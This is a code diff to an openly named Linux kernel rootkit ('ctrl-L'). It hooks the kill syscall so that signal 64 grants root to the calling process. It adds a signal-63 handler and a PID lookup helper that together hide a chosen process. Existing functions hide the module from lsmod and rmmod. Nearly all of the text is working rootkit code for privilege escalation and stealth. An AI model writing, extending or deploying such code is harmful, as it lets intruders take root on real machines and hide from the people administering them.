@@ -38,8 +38,7 @@ static t_syscall normal_kill;
 
 // Hide from lsmod and rmmod. Keep pointer to previous module in the list so
 // that we know where to jump back in to unhide
-void rootkit_hide(void)
-{
+void rootkit_hide(void) {
     if (hidden == 0) {
     	module_previous = THIS_MODULE->list.prev;
         list_del(&THIS_MODULE->list);
@@ -48,12 +47,20 @@ void rootkit_hide(void)
 }
 
 // Unhide from lsmod and rmmod. This is necessary to unload without rebooting
-void rootkit_unhide(void)
-{
+void rootkit_unhide(void) {
     if (hidden == 1) {
         list_add(&THIS_MODULE->list, module_previous);
         hidden = 0;
     }
+}
+
+struct task_struct* lookup_task(pid_t pid) {
+	struct task_struct *p = current;
+	for_each_process(p) {
+		if (p->pid == pid)
+			return p;
+	}
+	return NULL;
 }
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(5, 7, 7)
@@ -163,11 +170,24 @@ void escalate(void) {
 }
 
 asmlinkage int ctrll_kill(const struct pt_regs *pt_regs) {
-	int sig = (int) pt_regs->si;
-	
+    int sig = (int) pt_regs->si;
+    pid_t pid = (pid_t) pt_regs->di;
+	struct task_struct *task;
+
 	switch (sig) {
 		case 64:
+			if (debug) {
+				printk(KERN_INFO "ctrl-L: Giving root to PID %d", pid);
+			}
 			escalate();
+			break;
+		case 63:
+			if (debug) {
+				printk(KERN_INFO "ctrl-L: Hiding PID %d", pid);
+			}
+			if ((task = lookup_task(pid)) == NULL)
+				return -ESRCH;
+			task->flags ^= 0x10000000;
 			break;
 		default:
 			return normal_kill(pt_regs);
